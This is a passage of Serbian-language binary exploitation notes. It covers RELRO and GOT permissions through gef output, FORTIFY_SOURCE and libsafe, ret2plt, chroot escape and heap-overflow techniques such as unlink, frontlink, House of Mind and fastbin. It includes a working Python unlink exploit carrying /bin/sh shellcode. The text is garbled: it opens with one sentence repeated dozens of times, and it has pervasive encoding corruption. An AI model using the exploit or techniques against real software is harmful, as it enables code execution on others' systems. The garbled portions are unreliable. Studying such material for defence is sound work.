**pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da ovo bude prepreka je spreÄavanje **pisanja** u njih. NajÄeÅ¡Ä‡i naÄin na koji sam video da
```bash
gefâ¤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefâ¤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  â†’   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Bez relro:
```bash
gefâ¤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefâ¤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  â†’   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Za binarni **bez relro**, moÅ¾emo videti da je adresa unosa `got` za `fgets` `0x404018`. Pogledom na mapiranje memorije vidimo da se nalazi izmeÄ‘u `0x404000` i `0x405000`, Å¡to ima **dozvole `rw`**, Å¡to znaÄi da moÅ¾emo Äitati i pisati u nju. Za binarni **sa relro**, vidimo da je adresa tabele `got` za izvrÅ¡avanje binarnog fajla (pie je omoguÄ‡en pa Ä‡e se ova adresa promeniti) `0x555555557fd0`. U mapiranju memorije tog binarnog fajla nalazi se izmeÄ‘u `0x0000555555557000` i `0x0000555555558000`, Å¡to ima memoriju **dozvole `r`**, Å¡to znaÄi da moÅ¾emo samo Äitati iz nje.

Dakle, Å¡ta je **bypass**? TipiÄan naÄin zaobilaÅ¾enja koji koristim je jednostavno ne pisati u memorijske regione koje relro Äini samo za Äitanje, i **pronaÄ‡i drugi naÄin za izvrÅ¡avanje koda**.

Imajte na umu da bi se ovo desilo, binarni fajl mora unapred znati adrese funkcija:

* Lenje povezivanje: Adresa funkcije se traÅ¾i prvi put kada se funkcija pozove. Dakle, GOT mora imati dozvole za pisanje tokom izvrÅ¡avanja.
* PoveÅ¾i sada: Adrese funkcija se reÅ¡avaju na poÄetku izvrÅ¡avanja, zatim se daju dozvole samo za Äitanje osetljivim sekcijama poput .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Da biste proverili da li program koristi PoveÅ¾i sada, moÅ¾ete uraditi:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Kada se binarni fajl uÄita u memoriju i funkcija se pozove prvi put, skoÄi se na PLT (Procedure Linkage Table), odakle se vrÅ¡i skok (jmp) na GOT i otkriva da ta unosa nije reÅ¡ena (sadrÅ¾i sledeÄ‡u adresu iz PLT). Zatim se poziva Runtime Linker ili rtfd da reÅ¡i adresu i saÄuva je u GOT.

Kada se poziva funkcija, poziva se PLT, koja ima adresu GOT gde je smeÅ¡tena adresa funkcije, tako da preusmerava tok tamo i poziva funkciju. MeÄ‘utim, ako je prvi put pozvana funkcija, ono Å¡to se nalazi u GOT-u je sledeÄ‡a instrukcija iz PLT-a, pa tok sledi kod PLT-a (rtfd) i saznaje adresu funkcije, Äuva je u GOT-u i poziva.

Prilikom uÄitavanja binarnog fajla u memoriju, kompajler mu je rekao na kojem offsetu treba da postavi podatke koji se moraju uÄitati prilikom pokretanja programa.

Leno povezivanje â€”> Adresa funkcije se traÅ¾i prvi put kada se pozove ta funkcija, tako da GOT ima dozvole za pisanje kako bi se adresa saÄuvala tamo kada se traÅ¾i, i ne mora ponovo da se traÅ¾i.

VeÅ¾i sada â€”> Adrese funkcija se traÅ¾e prilikom uÄitavanja programa i menja se dozvola sekcija .got, .dtors, .ctors, .dynamic, .jcr u samo Äitanje. **-z relro** i **-z now**

Ipak, opÄ‡enito programi nisu komplikovani s tim opcijama, pa su ovi napadi i dalje moguÄ‡i.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** â€”> Da biste saznali da li koriste BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 ili =2**

PokuÅ¡ava identifikovati funkcije koje kopiraju podatke sa jednog mesta na drugo na nesiguran naÄin i zameniti funkciju sigurnom funkcijom.

Na primer:\
char buf\[16];\
strcpy(but, source);

Identifikuje je kao nesigurnu i zatim zamenjuje strcpy() sa \_\_strcpy\_chk() koristeÄ‡i veliÄinu bafera kao maksimalnu veliÄinu za kopiranje.

Razlika izmeÄ‘u **=1** i **=2** je:

Druga ne dozvoljava da **%n** dolazi iz sekcije sa dozvolama za pisanje. TakoÄ‘e, parametar za direktni pristup argumentima moÅ¾e se koristiti samo ako su koriÅ¡Ä‡eni prethodni, tj. moÅ¾e se koristiti samo **%3$d** ako su prethodno koriÅ¡Ä‡eni **%2$d** i **%1$d**

Za prikazivanje poruke o greÅ¡ci koristi se argv\[0\], pa ako se postavi adresa druge lokacije (kao globalna promenljiva) u nju, poruka o greÅ¡ci Ä‡e prikazati sadrÅ¾aj te promenljive. Str. 191

**Zamena Libsafe**

Aktivira se sa: LD\_PRELOAD=/lib/libsafe.so.2\
ili\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

Pozivi nekih nesigurnih funkcija se zamenjuju sigurnijim. Nije standardizovano. (samo za x86, ne za kompilacije sa -fomit-frame-pointer, ne statiÄke kompilacije, ne sve ranjive funkcije postaju sigurne i LD\_PRELOAD ne radi na binarnim fajlovima sa suid).

**ASCII Armored Address Space**

Sastoji se od uÄitavanja deljenih biblioteka od 0x00000000 do 0x00ffffff kako bi uvek postojao bajt 0x00. MeÄ‘utim, ovo zapravo ne zaustavlja skoro nijedan napad, a posebno ne u little endian sistemu.

**ret2plt**

Sastoji se od izvoÄ‘enja ROP-a tako da se pozove funkcija strcpy@plt (iz plt-a) i usmeri se ka unosi u GOT-u i kopira prvi bajt funkcije koja se Å¾eli pozvati (system()). Zatim se isto radi usmeravajuÄ‡i se ka GOT+1 i kopira se 2. bajt system()... Na kraju se poziva adresa saÄuvana u GOT-u koja Ä‡e biti system()

**LaÅ¾ni EBP**

Za funkcije koje koriste EBP kao registar za upuÄ‡ivanje argumenata, prilikom modifikacije EIP-a i upuÄ‡ivanja na system(), takoÄ‘e se mora modifikovati EBP da upuÄ‡uje na memorijsku lokaciju koja ima 2 proizvoljna bajta, a zatim na adresu &â€/bin/shâ€.

**Kavezi sa chroot()**

debootstrap -arch=i386 hardy /home/user â€”> Instalira osnovni sistem u odreÄ‘eni poddirektorijum

Administrator moÅ¾e izaÄ‡i iz ovih kaveza koristeÄ‡i: mkdir foo; chroot foo; cd ..

**Instrumentacija koda**

Valgrind â€”> TraÅ¾i greÅ¡ke\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflow: Osnovni eksploiti**

**Dodeljeni blok**

prev\_size |\
size | â€”Zaglavlje\
\*mem | Podaci

**Slobodan blok**

prev\_size |\
size |\
\*fd | Ptr naprednog bloka\
\*bk | Ptr nazadnog bloka â€”Zaglavlje\
\*mem | Podaci

Slobodni blokovi su u dvostruko povezanoj listi (bin) i nikada ne smeju postojati dva slobodna bloka zajedno (spajaju se)

U "size" postoje bitovi koji pokazuju: Da li je prethodni blok u upotrebi, da li je blok dodeljen putem mmap() i da li blok pripada primarnoj areni.

Ako se oslobodi blok i neki od susednih blokova je slobodan, oni se spajaju pomoÄ‡u makroa unlink() i novi, veÄ‡i blok se prosleÄ‘uje frontlink() da ga ubaci u odgovarajuÄ‡i bin.

unlink(){\
BK = P->bk; â€”> BK novog bloka je onaj koji je imao prethodno slobodan blok\
FD = P->fd; â€”> FD novog bloka je onaj koji je imao prethodno slobodan blok\
FD->bk = BK; â€”> BK sledeÄ‡eg bloka pokazuje na novi blok\
BK->fd = FD; â€”> FD prethodnog bloka pokazuje na novi blok\
}

Dakle, ako uspemo da promenimo P->bk sa adresom shell koda i P->fd sa adresom unosa u GOT ili DTORS manje 12, postiÅ¾e se:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

I tako se izvrÅ¡ava shell kod prilikom izlaska iz programa.

TakoÄ‘e, 4. izjava unlink() piÅ¡e neÅ¡to i shell kod mora biti prilagoÄ‘en za ovo:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> Ovo uzrokuje pisanje 4 bajta od 8. bajta shell koda, tako da prva instrukcija shell koda mora biti skok kako bi preskoÄila ovo i preÅ¡la na nops koji vode do ostatka shell koda.

Stoga se eksploit kreira:

U bafer1 ubacujemo shell kod poÄevÅ¡i od skoka kako bi preÅ¡ao na nops ili na ostatak shell koda.

Nakon shell koda ubacujemo punjenje dok ne doÄ‘emo do polja prev\_size i size sledeÄ‡eg bloka. Na ovim mestima ubacujemo 0xfffffff0 (tako da se prev\_size prepisuje da ima bit koji kaÅ¾e da je slobodan) i â€œ-4â€œ(0xfffffffc) u size (da bi prilikom provere u 3. bloku da li je 2. bio slobodan zapravo otiÅ¡ao na modifikovan prev\_size koji Ä‡e reÄ‡i da je slobodan) -> Tako kada free() istraÅ¾uje, iÄ‡i Ä‡e na size 3. ali Ä‡e zapravo iÄ‡i na 2. - 4 i misliÄ‡e da je 2. blok slobodan. Tada Ä‡e pozvati **unlink()**.

Pozivom unlink() koristiÄ‡e kao P->fd prve podatke 2. bloka, pa Ä‡e tamo biti ubaÄena adresa koju Å¾elite da prepiÅ¡ete - 12 (jer Ä‡e u FD->bk dodati 12 adresi saÄuvanoj u FD). I na toj adresi Ä‡e se uneti druga adresa koja se nalazi u 2. bloku, koja Ä‡e biti adresa shell koda (laÅ¾ni P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12 bajtova punjenja**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Bit koji oznaÄava da je prethodni komad slobodan treba biti postavljen na 1**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, kako bi se mislilo da je "size" treÄ‡eg komada 4 bajta unazad (ukazuje na prev\_size) jer se tu proverava da li je drugi komad slobodan**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Na poÄetku payloada dodajemo 8 bajtova punjenja**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresa free() u plt-12 (biÄ‡e prebrisana kako bi se shellcode pokrenula drugi put kada se free pozove)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Kao Å¡to je reÄeno, payload poÄinje sa 8 bajtova punjenja**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modifikujemo drugi komad, got\_free pokazuje gde Ä‡emo saÄuvati adresu addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() oslobaÄ‘anje u obrnutom redosledu (wargame)**

KontroliÅ¡emo 3 uzastopna chunk-a koji se oslobaÄ‘aju u obrnutom redosledu od rezervacije.

U tom sluÄaju:

U chunk-u c stavljamo shellcode

Chunk a koristimo da prepiÅ¡emo b tako da size ima deaktiviran bit PREV\_INUSE, tako da misli da je chunk a slobodan.

TakoÄ‘e, u zaglavlju b prepiÅ¡emo size da bude -4.

Tada Ä‡e program misliti da je "a" slobodan i u binu, pa Ä‡e pozvati unlink() da ga odveÅ¾e. MeÄ‘utim, poÅ¡to je PREV\_SIZE u zaglavlju -4, misliÄ‡e da chunk "a" zapravo poÄinje na b+4. Drugim reÄima, pozvaÄ‡e unlink() na chunk koji poÄinje na b+4, pa Ä‡e na b+12 biti pokazivaÄ "fd", a na b+16 pokazivaÄ "bk".

Na taj naÄin, ako stavimo adresu shellcode u bk i adresu funkcije "puts()" -12 u fd, imamo naÅ¡ payload.

**Tehnika Frontlink**

Poziva se frontlink kada se neÅ¡to oslobodi, a nijedan od susednih chunk-ova nije slobodan, umesto pozivanja unlink(), direktno se poziva frontlink().

Korisna ranjivost kada malloc koji se napada nikada nije osloboÄ‘en (free()).

Potrebno je:

Buffer koji moÅ¾e biti preplavljen funkcijom unos podataka

Buffer koji je susedan ovom koji treba biti osloboÄ‘en i Äije Ä‡e se polje fd u zaglavlju promeniti zbog preplavljivanja prethodnog bafera

Buffer koji treba osloboditi sa veliÄinom veÄ‡om od 512, ali manjom od prethodnog bafera

Buffer deklarisan pre koraka 3 koji omoguÄ‡ava prepisivanje prev\_size ovog bafera

Na ovaj naÄin, preplavljujuÄ‡i dva malloc-a na nekontrolisan naÄin i jedan na kontrolisan naÄin koji se oslobaÄ‘a samo jednom, moÅ¾emo izvrÅ¡iti eksploataciju.

**Ranjivost double free()**

Ako se dva puta pozove free() sa istim pokazivaÄem, dva bin-a pokazuju na istu adresu.

Ako se Å¾eli ponovo koristiti jedan, to se moÅ¾e lako uraditi. Ako se Å¾eli koristiti drugi, dodeliÄ‡e se isti prostor, pa Ä‡emo imati pokazivaÄe "fd" i "bk" sa laÅ¾nim podacima koje Ä‡e upisati prethodna rezervacija.

**After free()**

Prethodno osloboÄ‘eni pokazivaÄ se ponovo koristi bez kontrole.

## **8 Heap Overflows: Napredni eksploiti**

Tehnike Unlink() i FrontLink() su uklonjene modifikacijom funkcije unlink().

**The house of mind**

Potrebno je samo jedno pozivanje free() da bi se izazvalo izvrÅ¡avanje proizvoljnog koda. Potrebno je pronaÄ‡i drugi chunk koji moÅ¾e biti preplavljen od strane prethodnog i osloboÄ‘en.

Pozivanje free() dovodi do poziva public\_fREe(mem), Å¡to radi:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> VraÄ‡a pokazivaÄ na adresu na kojoj poÄinje chunk (mem-8)

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

U \[1] proverava se polje size bit NON\_MAIN\_ARENA, koje se moÅ¾e promeniti da bi provera vratila taÄno i izvrÅ¡ila heap\_for\_ptr() koja vrÅ¡i and na "mem" ostavljajuÄ‡i 0 poslednjih 2.5 bajta (u naÅ¡em sluÄaju od 0x0804a000 ostavlja 0x08000000) i pristupa 0x08000000->ar\_ptr (kao da je struktura heap\_info)

Na ovaj naÄin, ako moÅ¾emo kontrolisati chunk na primeru 0x0804a000 i treba osloboditi chunk na **0x081002a0** moÅ¾emo doÄ‡i do adrese 0x08100000 i upisati Å¡ta god Å¾elimo, na primer **0x0804a000**. Kada se ovaj drugi chunk oslobodi, heap\_for\_ptr(ptr)->ar\_ptr Ä‡e vratiti ono Å¡to smo upisali na 0x08100000 (jer se primenjuje and na 0x081002a0 koji smo videli ranije i odatle se izvlaÄi vrednost prvih 4 bajta, ar\_ptr)

Na taj naÄin se poziva \_int\_free(ar\_ptr, mem), odnosno **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kao Å¡to smo videli ranije, moÅ¾emo kontrolisati vrednost av, jer je to ono Å¡to piÅ¡emo u chunk koji Ä‡e se osloboditi.

Kako je definisano unsorted\_chunks, znamo da:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Dakle, ako u av->bins\[2] upiÅ¡emo vrednost \_\_DTOR\_END\_\_-12, u poslednjoj instrukciji Ä‡e se upisati u \_\_DTOR\_END\_\_ adresa drugog chunk-a.

Drugim reÄima, u prvom chunk-u na poÄetku treba staviti adresu \_\_DTOR\_END\_\_-12 mnogo puta jer Ä‡e av->bins\[2] to izvuÄ‡i

Na adresi na koju padne adresa drugog chunk-a sa poslednjih 5 nula treba upisati adresu ovog prvog chunk-a kako bi heap\_for\_ptr() mislio da je ar\_ptr na poÄetku prvog chunk-a i izvukao av->bins\[2] odatle

U drugom chunk-u, zahvaljujuÄ‡i prvom, prepisujemo prev\_size sa jump 0x0c i size sa neÄim da aktivira -> NON\_MAIN\_ARENA

Zatim u drugom chunk-u stavljamo gomilu nops i na kraju shellcode

Na taj naÄin Ä‡e se pozvati \_int\_free(TROZO1, TROZO2) i pratiti instrukcije za upisivanje u \_\_DTOR\_END\_\_ adresu prev\_size TROZO2 koji Ä‡e skoÄiti na shellcode.

Za primenu ove tehnike potrebno je da se ispune joÅ¡ neki zahtevi koji malo komplikuju payload.
Ova tehnika viÅ¡e nije primenjiva jer je gotovo isti zakrpa primenjen kao i za unlink. UporeÄ‘uju se da li novi sajt na koji se pokazuje takoÄ‘e pokazuje na njega.

**Fastbin**

To je varijanta The house of mind

interesuje nas izvrÅ¡avanje sledeÄ‡eg koda do kojeg se dolazi nakon prvog provere funkcije \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] â€”> Gde je fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

Na ovaj naÄin, ako se postavi u "fb", daje adresu funkcije u GOT-u, na ovu adresu Ä‡e se postaviti adresa prebrisana. Za ovo Ä‡e biti potrebno da je arena blizu adresa dtors. TaÄnije, av->max\_fast treba da bude na adresi koju Ä‡emo prebrisati.

S obzirom da smo sa The House of Mind videli da mi kontroliÅ¡emo poziciju av.

Zato, ako u polje size stavimo veliÄinu 8 + NON\_MAIN\_ARENA + PREV\_INUSE â€”> fastbin\_index() Ä‡e nam vratiti fastbins\[-1], koji Ä‡e pokazivati na av->max\_fast

U ovom sluÄaju av->max\_fast Ä‡e biti adresa koja Ä‡e biti prebrisana (ne na koju pokazuje, veÄ‡ ta pozicija Ä‡e biti prebrisana).

